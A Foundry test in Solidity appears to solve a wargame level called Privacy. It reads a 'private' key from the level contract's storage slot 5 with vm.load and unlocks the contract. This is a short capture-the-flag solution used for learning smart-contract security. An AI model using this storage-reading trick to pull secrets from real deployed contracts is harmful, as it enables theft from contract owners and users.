pragma solidity ^0.8.0;

import 'forge-std/Test.sol';
import 'levels/PrivacyFactory.sol';
import 'levels/Privacy.sol';
import 'utils/TestUtils.sol';

contract PrivacyTest is Test {
  address player;
  Utils utils;
  PrivacyFactory privacyFactory;
  address payable privacyAddress;
  Privacy privacy;

  function setUp() public {
    utils = new Utils();
    player = utils.createUsers(1)[0];
    privacyFactory = new PrivacyFactory();
    privacyAddress = payable(privacyFactory.createInstance(player));
    privacy = Privacy(privacyAddress);
  }

  function testHack() public {
    bytes16 _key = bytes16(vm.load(privacyAddress, bytes32(uint256(5))));
    privacy.unlock(_key);
    assertTrue(privacyFactory.validateInstance(privacyAddress, player), 'Level not solved');
  }
}
